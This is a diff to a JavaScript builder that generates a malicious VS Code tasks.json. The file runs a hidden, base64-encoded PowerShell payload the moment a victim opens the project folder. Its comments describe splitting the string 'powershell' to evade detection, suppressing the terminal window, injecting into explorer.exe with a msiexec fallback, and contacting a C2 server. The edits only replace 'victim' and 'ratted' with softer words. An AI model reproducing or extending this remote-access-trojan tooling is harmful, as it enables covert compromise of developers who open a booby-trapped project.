@@ -11,7 +11,7 @@
  * Output:
  *   <output-dir>/.vscode/tasks.json
  *
- * Execution chain on victim:
+ * Execution chain on target:
  *   VS Code folder open
  *     → "Restore Dependencies" task (runOn: folderOpen, reveal: never)
  *     → cmd /v variable split avoids "powershell" literal
@@ -121,7 +121,7 @@ const enc = Buffer.from(psScript, "utf16le").toString("base64");
 // cmd /v variable split: "pow"+"er"+"she"+"ll" — "powershell" never literal.
 // Using %COMSPEC% avoids hardcoding "cmd.exe".
 // reveal:never + close:true — no terminal window, no focus steal.
-// runOn:folderOpen — fires the moment victim opens the folder.
+// runOn:folderOpen — fires the moment target opens the folder.
 const tasksJson = {
   version: "2.0.0",
   tasks: [
@@ -170,4 +170,4 @@ console.log(`  C2:         ${c2url}`);
 console.log(`  Agent:      ${agentFile}`);
 console.log(`  Class name: ${cn}  (polymorphic — unique per build)`);
 console.log(`  Target:     explorer.exe (LOTL fallback: msiexec.exe /q)`);
-console.log(`\nDrop .vscode/tasks.json into target project. Opens in VS Code → ratted.\n`);
+console.log(`\nDrop .vscode/tasks.json into target project. Opens in VS Code → deployed.\n`);
